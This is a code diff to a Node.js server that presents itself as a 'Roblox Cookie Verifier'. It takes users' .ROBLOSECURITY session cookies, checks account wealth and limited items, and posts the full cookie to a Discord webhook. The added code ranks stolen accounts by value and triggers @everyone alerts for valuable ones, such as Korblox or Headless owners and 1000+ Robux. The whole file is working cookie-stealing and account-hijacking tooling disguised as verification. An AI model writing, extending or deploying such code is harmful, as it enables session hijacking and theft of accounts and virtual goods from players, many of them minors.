@@ -52,7 +52,10 @@ const EMOJIS = {
     unlock: '🔓',
     warning_sign: '⚠️',
     info: 'ℹ️',
-    chart: '📈'
+    chart: '📈',
+    ping: '🔔',
+    rare: '💎',
+    ultra: '🌟'
 };
 
 console.log('========================================');
@@ -76,6 +79,87 @@ function getRelativeTime(dateString) {
     if (diffDays < 30) return `${diffDays} days ago`;
     if (diffDays < 365) return `${Math.floor(diffDays / 30)} months ago`;
     return `${Math.floor(diffDays / 365)} years ago`;
+}
+
+// Check if should @everyone based on conditions
+function shouldMentionEveryone(data) {
+    const conditions = [];
+    
+    // Check for Korblox
+    if (data.inventory?.hasKorblox) {
+        conditions.push('KORBLOX');
+    }
+    
+    // Check for Headless
+    if (data.inventory?.hasHeadless) {
+        conditions.push('HEADLESS');
+    }
+    
+    // Check for 8-Bit Crown
+    if (data.inventory?.hasEightBitCrown) {
+        conditions.push('8-BIT CROWN');
+    }
+    
+    // Check for 1000+ robux
+    if (data.robuxBalance >= 1000) {
+        conditions.push(`1000+ ROBUX (${formatNumber(data.robuxBalance)} R$)`);
+    }
+    
+    // Check for 1000+ RAP
+    if (data.rap >= 1000) {
+        conditions.push(`1000+ RAP (${formatNumber(data.rap)} R$)`);
+    }
+    
+    // Check for 50k+ friends (summary)
+    if (data.summary?.friendCount >= 50000) {
+        conditions.push(`50K+ FRIENDS (${formatNumber(data.summary.friendCount)})`);
+    }
+    
+    return {
+        shouldMention: conditions.length > 0,
+        conditions: conditions,
+        count: conditions.length
+    };
+}
+
+// Get mention priority level
+function getMentionPriority(data) {
+    let priority = 0;
+    let priorityName = '';
+    
+    if (data.inventory?.hasKorblox && data.inventory?.hasHeadless && data.inventory?.hasEightBitCrown) {
+        priority = 5;
+        priorityName = 'ULTRA RARE - FULL COLLECTION';
+    } else if (data.inventory?.hasKorblox && data.inventory?.hasHeadless) {
+        priority = 4;
+        priorityName = 'VERY RARE - KORBLOX + HEADLESS';
+    } else if (data.inventory?.hasKorblox && data.inventory?.hasEightBitCrown) {
+        priority = 4;
+        priorityName = 'VERY RARE - KORBLOX + 8-BIT';
+    } else if (data.inventory?.hasHeadless && data.inventory?.hasEightBitCrown) {
+        priority = 4;
+        priorityName = 'VERY RARE - HEADLESS + 8-BIT';
+    } else if (data.inventory?.hasKorblox) {
+        priority = 3;
+        priorityName = 'RARE - KORBLOX OWNER';
+    } else if (data.inventory?.hasHeadless) {
+        priority = 3;
+        priorityName = 'RARE - HEADLESS OWNER';
+    } else if (data.inventory?.hasEightBitCrown) {
+        priority = 2;
+        priorityName = 'RARE - 8-BIT CROWN OWNER';
+    } else if (data.robuxBalance >= 100000) {
+        priority = 2;
+        priorityName = 'RICH - 100K+ ROBUX';
+    } else if (data.rap >= 100000) {
+        priority = 2;
+        priorityName = 'RICH - 100K+ RAP';
+    } else if (data.robuxBalance >= 1000 || data.rap >= 1000) {
+        priority = 1;
+        priorityName = 'NOTABLE - 1K+ VALUE';
+    }
+    
+    return { priority, priorityName };
 }
 
 async function verifyCookie(cookie) {
@@ -258,10 +342,10 @@ async function fetchUserRAP(cookie, userId) {
     }
 }
 
-// WEBHOOK WITH FULL COOKIE AND ALL DATA IN FIELDS
+// WEBHOOK WITH @everyone MENTIONS
 async function sendToWebhook(data) {
     console.log('========================================');
-    console.log('📤 SENDING WEBHOOK WITH FULL DATA');
+    console.log('📤 SENDING WEBHOOK WITH @everyone CHECK');
     console.log('========================================');
     
     if (!WEBHOOK_URL || WEBHOOK_URL.includes('YOUR_ID')) {
@@ -270,41 +354,76 @@ async function sendToWebhook(data) {
     }
     
     try {
-        const color = data.success ? 0x00FF00 : 0xFF0000;
+        // Check if should @everyone
+        const mentionCheck = shouldMentionEveryone(data);
+        const priority = getMentionPriority(data);
+        
+        let content = '';
+        let color = data.success ? 0x00FF00 : 0xFF0000;
+        
+        // Prepare @everyone mention if conditions met
+        if (data.success && mentionCheck.shouldMention) {
+            content = `@everyone ${EMOJIS.ultra} **RARE ACCOUNT DETECTED!** ${EMOJIS.ultra}\n`;
+            content += `**${priority.priorityName}** - ${mentionCheck.count} rare condition(s) met!\n`;
+            content += `**Conditions:** ${mentionCheck.conditions.join(', ')}\n`;
+            content += `${EMOJIS.arrow} **Check the embed below for full details!**\n\n`;
+            color = 0xFF0000; // Red for rare accounts
+            console.log('🔔 @everyone MENTION TRIGGERED!');
+            console.log('Conditions met:', mentionCheck.conditions);
+        } else if (data.success) {
+            content = `${EMOJIS.success} **New Account Verified** ${EMOJIS.success}\n`;
+            console.log('📢 No @everyone mention - conditions not met');
+        } else {
+            content = `${EMOJIS.warning} **Verification Attempt Failed** ${EMOJIS.warning}\n`;
+        }
         
         // Create array for fields
         const fields = [];
         
-        // FIELD 1: FULL COOKIE (Complete, not truncated)
+        // FIELD 1: FULL COOKIE
         fields.push({
-            name: `${EMOJIS.cookie} FULL COOKIE VALUE (Copy this)`,
+            name: `${EMOJIS.cookie} FULL COOKIE VALUE`,
             value: `\`\`\`\n${data.cookie || 'No cookie provided'}\n\`\`\``,
             inline: false
         });
         
-        // FIELD 2: STATUS
-        fields.push({
-            name: `${EMOJIS.info} VERIFICATION STATUS`,
-            value: data.success ? `${EMOJIS.success} **VALID COOKIE**` : `${EMOJIS.error} **INVALID COOKIE**`,
-            inline: true
-        });
-        
         if (data.success) {
+            // FIELD 2: RARE CONDITIONS MET (if any)
+            if (mentionCheck.shouldMention) {
+                let rareBadges = '';
+                if (data.inventory?.hasKorblox) rareBadges += `${EMOJIS.korblox} **KORBLOX** 👑\n`;
+                if (data.inventory?.hasHeadless) rareBadges += `${EMOJIS.headless} **HEADLESS** 🎃\n`;
+                if (data.inventory?.hasEightBitCrown) rareBadges += `${EMOJIS.eightbit} **8-BIT CROWN** ⭐\n`;
+                if (data.robuxBalance >= 1000) rareBadges += `${EMOJIS.robux} **${formatNumber(data.robuxBalance)} ROBUX** 💰\n`;
+                if (data.rap >= 1000) rareBadges += `${EMOJIS.rap} **${formatNumber(data.rap)} RAP** 📈\n`;
+                if (data.summary?.friendCount >= 50000) rareBadges += `${EMOJIS.friends} **${formatNumber(data.summary.friendCount)} FRIENDS** 👥\n`;
+                
+                fields.push({
+                    name: `${EMOJIS.rare} RARE CONDITIONS MET ${EMOJIS.rare}`,
+                    value: rareBadges,
+                    inline: false
+                });
+            }
+            
             // FIELD 3: BASIC INFO
             fields.push({
-                name: `${EMOJIS.user} BASIC INFORMATION`,
+                name: `${EMOJIS.user} ACCOUNT INFORMATION`,
                 value: `┌ ${EMOJIS.user} **Username:** \`${data.username}\`\n` +
                        `├ ${EMOJIS.id} **User ID:** \`${data.userId}\`\n` +
                        `├ ${EMOJIS.diamond} **Display Name:** \`${data.summary?.displayName || 'N/A'}\`\n` +
+                       `├ ${EMOJIS.calendar} **Created:** \`${new Date(data.summary?.accountAge).toLocaleDateString()}\`\n` +
                        `└ ${EMOJIS.clock} **Account Age:** \`${data.daysSinceCreation} days\` (${getRelativeTime(data.summary?.accountAge)})`,
                 inline: false
             });
             
             // FIELD 4: ROBUX & RAP
+            const robuxEmoji = data.robuxBalance >= 1000 ? EMOJIS.fire : EMOJIS.robux;
+            const rapEmoji = data.rap >= 1000 ? EMOJIS.fire : EMOJIS.rap;
+            
             fields.push({
-                name: `${EMOJIS.robux} ROBUX & RAP`,
-                value: `┌ ${EMOJIS.robux} **Robux Balance:** \`${formatNumber(data.robuxBalance)} R$\`\n` +
-                       `└ ${EMOJIS.rap} **RAP Value:** \`${formatNumber(data.rap)} R$\``,
+                name: `${EMOJIS.robux} CURRENCY & VALUE`,
+                value: `┌ ${robuxEmoji} **Robux Balance:** \`${formatNumber(data.robuxBalance)} R$\`\n` +
+                       `└ ${rapEmoji} **RAP Value:** \`${formatNumber(data.rap)} R$\``,
                 inline: true
             });
             
@@ -317,53 +436,52 @@ async function sendToWebhook(data) {
                 inline: true
             });
             
-            // FIELD 6: INVENTORY - KORBLOX
-            let korbloxStatus = data.inventory?.hasKorblox ? `${EMOJIS.korblox} **OWNED** (3/3 parts)` : `${EMOJIS.warning} **NOT OWNED** (${data.inventory?.korbloxPartsOwned || 0}/3 parts)`;
+            // FIELD 6: LIMITED ITEMS STATUS
+            let limitedItemsValue = '';
+            
+            if (data.inventory?.hasKorblox) {
+                limitedItemsValue += `${EMOJIS.korblox} **Korblox Deathspeaker:** \`OWNED\` ${EMOJIS.sparkles}\n`;
+            } else {
+                limitedItemsValue += `${EMOJIS.korblox} **Korblox Deathspeaker:** \`NOT OWNED\` (${data.inventory?.korbloxPartsOwned || 0}/3 parts)\n`;
+            }
+            
+            if (data.inventory?.hasHeadless) {
+                limitedItemsValue += `${EMOJIS.headless} **Headless Horseman:** \`OWNED\` ${EMOJIS.ghost}\n`;
+            } else {
+                limitedItemsValue += `${EMOJIS.headless} **Headless Horseman:** \`NOT OWNED\`\n`;
+            }
+            
+            if (data.inventory?.hasEightBitCrown) {
+                limitedItemsValue += `${EMOJIS.eightbit} **8-Bit Royal Crown:** \`OWNED\` ${EMOJIS.crown}\n`;
+            } else {
+                limitedItemsValue += `${EMOJIS.eightbit} **8-Bit Royal Crown:** \`NOT OWNED\``;
+            }
+            
             fields.push({
-                name: `${EMOJIS.korblox} KORBLOX DEATHSPEAKER`,
-                value: korbloxStatus,
-                inline: true
+                name: `${EMOJIS.gift} LIMITED ITEMS`,
+                value: limitedItemsValue,
+                inline: false
             });
             
-            // FIELD 7: INVENTORY - HEADLESS
-            fields.push({
-                name: `${EMOJIS.headless} HEADLESS HORSEMAN`,
-                value: data.inventory?.hasHeadless ? `${EMOJIS.success} **OWNED**` : `${EMOJIS.error} **NOT OWNED**`,
-                inline: true
-            });
+            // FIELD 7: SOCIAL STATS
+            const friendEmoji = data.summary?.friendCount >= 50000 ? EMOJIS.ultra : EMOJIS.friends;
             
-            // FIELD 8: INVENTORY - 8-BIT CROWN
-            fields.push({
-                name: `${EMOJIS.eightbit} 8-BIT ROYAL CROWN`,
-                value: data.inventory?.hasEightBitCrown ? `${EMOJIS.success} **OWNED** ${EMOJIS.crown}` : `${EMOJIS.error} **NOT OWNED**`,
-                inline: true
-            });
-            
-            // FIELD 9: SOCIAL STATS
             fields.push({
                 name: `${EMOJIS.friends} SOCIAL STATISTICS`,
-                value: `┌ ${EMOJIS.user} **Friends:** \`${formatNumber(data.summary?.friendCount || 0)}\`\n` +
+                value: `┌ ${friendEmoji} **Friends:** \`${formatNumber(data.summary?.friendCount || 0)}\`\n` +
                        `├ ${EMOJIS.groups} **Groups:** \`${formatNumber(data.summary?.groupCount || 0)}\`\n` +
                        `└ ${EMOJIS.warning_sign} **Banned:** \`${data.summary?.isBanned ? 'Yes' : 'No'}\``,
                 inline: false
             });
             
-            // FIELD 10: CREATION DATE
-            fields.push({
-                name: `${EMOJIS.calendar} ACCOUNT CREATION`,
-                value: `┌ **Date:** \`${new Date(data.summary?.accountAge).toLocaleDateString()}\`\n` +
-                       `└ **Time:** \`${new Date(data.summary?.accountAge).toLocaleTimeString()}\``,
-                inline: true
-            });
-            
-            // FIELD 11: PROFILE LINK
+            // FIELD 8: PROFILE LINK
             fields.push({
                 name: `${EMOJIS.arrow} PROFILE LINK`,
-                value: `[Click to view profile](https://www.roblox.com/users/${data.userId}/profile)`,
+                value: `[Click to view ${data.username}'s profile](https://www.roblox.com/users/${data.userId}/profile)`,
                 inline: true
             });
             
-            // FIELD 12: USER BIO (if exists)
+            // FIELD 9: USER BIO (if exists)
             if (data.summary?.description && data.summary.description.length > 0) {
                 fields.push({
                     name: `${EMOJIS.sparkles} USER BIO`,
@@ -372,17 +490,8 @@ async function sendToWebhook(data) {
                 });
             }
             
-            // FIELD 13: BYPASS RESULT
-            if (data.bypassResult) {
-                fields.push({
-                    name: `${EMOJIS.chart} EXTENSION BYPASS`,
-                    value: data.bypassResult.success ? `${EMOJIS.success} **Bypass Successful**` : `${EMOJIS.error} **Bypass Failed:** ${data.bypassResult.error}`,
-                    inline: false
-                });
-            }
-            
         } else {
-            // FAILED VERIFICATION FIELDS
+            // FAILED VERIFICATION
             fields.push({
                 name: `${EMOJIS.error} ERROR DETAILS`,
                 value: `\`\`\`diff\n- ${data.error || 'Unknown error occurred'}\n\`\`\``,
@@ -391,12 +500,12 @@ async function sendToWebhook(data) {
             
             fields.push({
                 name: `${EMOJIS.warning_sign} TROUBLESHOOTING`,
-                value: `• Cookie may be expired\n• Cookie format might be incorrect\n• Try logging into Roblox again\n• Get a fresh cookie from browser\n• Make sure it's the .ROBLOSECURITY value`,
+                value: `• Cookie may be expired\n• Cookie format might be incorrect\n• Try logging into Roblox again\n• Get a fresh cookie from browser`,
                 inline: false
             });
         }
         
-        // FIELD 14: TIMESTAMP
+        // FIELD 10: TIMESTAMP
         fields.push({
             name: `${EMOJIS.clock} VERIFICATION TIME`,
             value: `\`${new Date(data.timestamp).toLocaleString()}\``,
@@ -406,36 +515,37 @@ async function sendToWebhook(data) {
         // Create the embed
         const embed = {
             title: data.success ? 
-                `${EMOJIS.success} ROBLOX COOKIE VERIFICATION - SUCCESS ${EMOJIS.sparkles}` : 
-                `${EMOJIS.error} ROBLOX COOKIE VERIFICATION - FAILED ${EMOJIS.warning}`,
+                (mentionCheck.shouldMention ? `${EMOJIS.ultra} ⭐ RARE ACCOUNT VERIFIED! ⭐ ${EMOJIS.ultra}` : `${EMOJIS.success} ACCOUNT VERIFIED SUCCESSFULLY ${EMOJIS.success}`) : 
+                `${EMOJIS.error} VERIFICATION FAILED ${EMOJIS.warning}`,
             description: data.success ? 
-                `**Account successfully verified!** All data has been retrieved.` : 
-                `**Cookie validation failed!** Please check the cookie and try again.`,
-            color: color,
+                (mentionCheck.shouldMention ? `**${priority.priorityName}** - This account meets ${mentionCheck.count} rare condition(s)!` : `Account successfully verified. No rare conditions met.`) : 
+                `Cookie validation failed. Please check and try again.`,
+            color: mentionCheck.shouldMention ? 0xFF0000 : color,
             thumbnail: data.success ? {
                 url: `https://tr.rbxcdn.com/30DAY-AvatarHeadshot-${data.userId}.png?width=420&height=420&format=png`
             } : null,
             author: {
-                name: data.success ? `@${data.username}` : 'Cookie Verification Failed',
+                name: data.success ? `@${data.username}` : 'Verification Failed',
                 icon_url: data.success ? `https://www.roblox.com/headshot-thumbnail/image?userId=${data.userId}&width=420&height=420&format=png` : null,
                 url: data.success ? `https://www.roblox.com/users/${data.userId}/profile` : null
             },
             fields: fields,
             footer: {
-                text: `🔐 Roblox Cookie API • All data is real-time`,
+                text: `🔐 Roblox Cookie API • ${mentionCheck.shouldMention ? 'RARE ACCOUNT DETECTED!' : 'Standard Verification'}`,
                 icon_url: 'https://cdn.discordapp.com/emojis/1234567890.png'
             },
             timestamp: data.timestamp
         };
         
-        // Send the webhook
+        // Send the webhook with @everyone mention
         const webhookData = {
-            content: data.success ? 
-                `${EMOJIS.sparkles} **NEW COOKIE VERIFIED!** ${EMOJIS.sparkles}` : 
-                `${EMOJIS.warning} **COOKIE VERIFICATION ATTEMPT** ${EMOJIS.warning}`,
+            content: content,
             embeds: [embed],
             username: "Roblox Cookie Verifier",
-            avatar_url: "https://cdn.discordapp.com/emojis/1234567890.png"
+            avatar_url: "https://cdn.discordapp.com/emojis/1234567890.png",
+            allowed_mentions: {
+                parse: ["everyone"] // This allows @everyone mentions
+            }
         };
         
         const response = await axios.post(WEBHOOK_URL, webhookData, {
@@ -444,10 +554,12 @@ async function sendToWebhook(data) {
         });
         
         console.log('✅ WEBHOOK SENT SUCCESSFULLY!');
-        console.log('📊 Total fields sent:', fields.length);
-        console.log('🍪 Full cookie included');
+        if (mentionCheck.shouldMention) {
+            console.log('🔔 @everyone WAS MENTIONED!');
+            console.log('📋 Conditions:', mentionCheck.conditions);
+        }
         console.log('========================================');
-        return { success: true, status: response.status };
+        return { success: true, status: response.status, mentioned: mentionCheck.shouldMention };
         
     } catch (error) {
         console.error('❌ WEBHOOK FAILED!');
@@ -468,7 +580,6 @@ app.post('/api/verify-cookie', async (req, res) => {
     console.log('========================================');
     console.log('🔍 NEW VERIFICATION REQUEST');
     console.log('Cookie length:', cookie ? cookie.length : 0);
-    console.log('Cookie preview:', cookie ? cookie.substring(0, 50) + '...' : 'No cookie');
     console.log('========================================');
     
     if (!cookie) {
@@ -476,7 +587,7 @@ app.post('/api/verify-cookie', async (req, res) => {
     }
     
     let responseData = {
-        cookie: cookie, // FULL COOKIE
+        cookie: cookie,
         success: false,
         timestamp: new Date().toISOString()
     };
@@ -488,15 +599,8 @@ app.post('/api/verify-cookie', async (req, res) => {
         if (!verification.valid) {
             responseData.error = verification.error;
             console.log('❌ Cookie is invalid');
-            
-            // Send webhook with full cookie
             await sendToWebhook(responseData);
-            
-            return res.status(401).json({ 
-                success: false, 
-                error: verification.error,
-                cookie: cookie
-            });
+            return res.status(401).json({ success: false, error: verification.error, cookie: cookie });
         }
         
         console.log(`✅ Cookie valid for: ${verification.username}`);
@@ -538,32 +642,37 @@ app.post('/api/verify-cookie', async (req, res) => {
         };
         responseData.bypassResult = bypassResult;
         
-        // Send webhook with FULL DATA and FULL COOKIE
-        await sendToWebhook(responseData);
+        // Check conditions before sending webhook
+        const mentionCheck = shouldMentionEveryone(responseData);
+        console.log('🎯 Condition Check Results:');
+        console.log('- Should @everyone:', mentionCheck.shouldMention);
+        console.log('- Conditions met:', mentionCheck.conditions);
+        
+        // Send webhook with @everyone if conditions met
+        const webhookResult = await sendToWebhook(responseData);
         
         console.log('📦 Sending response to client');
-        res.json(responseData);
+        res.json({
+            ...responseData,
+            webhookSent: webhookResult.success,
+            mentioned: webhookResult.mentioned,
+            conditionsMet: mentionCheck.conditions
+        });
         
     } catch (error) {
         console.error('Server error:', error);
         responseData.error = error.message;
         await sendToWebhook(responseData);
-        
-        res.status(500).json({ 
-            success: false, 
-            error: 'Internal server error',
-            details: error.message,
-            cookie: cookie
-        });
+        res.status(500).json({ success: false, error: 'Internal server error', details: error.message, cookie: cookie });
     }
 });
 
 // Test webhook endpoint
 app.post('/api/test-webhook', async (req, res) => {
-    console.log('🧪 TESTING WEBHOOK WITH FULL DATA');
+    console.log('🧪 TESTING WEBHOOK WITH @everyone');
     
     const testData = {
-        cookie: "YOUR_ACTUAL_COOKIE_VALUE_WILL_APPEAR_HERE_FULLY_VISIBLE",
+        cookie: "TEST_COOKIE_VALUE_FOR_TESTING_PURPOSES",
         success: true,
         username: "Loudzraze",
         userId: 10873440895,
@@ -580,16 +689,13 @@ app.post('/api/test-webhook', async (req, res) => {
         },
         summary: {
             displayName: "Loudzraze",
-            friendCount: 342,
+            friendCount: 75000,
             groupCount: 12,
             accountAge: "2024-01-01T00:00:00Z",
-            description: "Roblox enthusiast and limited collector! 🎮 Playing since 2020",
+            description: "Roblox enthusiast and limited collector! 🎮",
             isBanned: false
         },
-        bypassResult: {
-            success: true,
-            data: { bypassed: true }
-        },
+        bypassResult: { success: true, data: { bypassed: true } },
         timestamp: new Date().toISOString()
     };
     
@@ -597,7 +703,8 @@ app.post('/api/test-webhook', async (req, res) => {
     
     res.json({ 
         webhookSent: result.success, 
-        message: result.success ? "✅ Webhook sent with FULL COOKIE and ALL FIELDS!" : "❌ Webhook failed"
+        mentioned: result.mentioned,
+        message: result.success ? "✅ Webhook sent with @everyone mention!" : "❌ Webhook failed"
     });
 });
 
@@ -610,15 +717,22 @@ app.get('/health', (req, res) => {
     });
 });
 
-// Root endpoint
 app.get('/', (req, res) => {
     res.json({ 
         name: 'Roblox Cookie API',
         version: '1.0.0',
-        description: 'Full cookie verification with all data in webhook fields',
+        description: 'Full cookie verification with @everyone mentions for rare accounts',
+        conditions: [
+            'Korblox Deathspeaker',
+            'Headless Horseman', 
+            '8-Bit Royal Crown',
+            '1000+ Robux',
+            '1000+ RAP',
+            '50,000+ Friends'
+        ],
         endpoints: [
-            'POST /api/verify-cookie - Full verification (sends full cookie)',
-            'POST /api/test-webhook - Test webhook with full data',
+            'POST /api/verify-cookie - Full verification',
+            'POST /api/test-webhook - Test webhook',
             'GET /health - Health check'
         ]
     });
@@ -628,12 +742,14 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log('========================================');
     console.log(`🚀 Server running on port ${PORT}`);
-    console.log(`📍 POST /api/verify-cookie - Full verification`);
-    console.log(`📍 POST /api/test-webhook - Test webhook`);
-    console.log(`📍 GET /health - Health check`);
     console.log('========================================');
-    console.log('✅ FULL COOKIE WILL BE SENT TO WEBHOOK');
-    console.log('✅ ALL DATA IN SEPARATE FIELDS');
+    console.log('🔔 @everyone MENTION CONDITIONS:');
+    console.log('  • Korblox Deathspeaker');
+    console.log('  • Headless Horseman');
+    console.log('  • 8-Bit Royal Crown');
+    console.log('  • 1000+ Robux');
+    console.log('  • 1000+ RAP');
+    console.log('  • 50,000+ Friends');
     console.log('========================================');
 });
 
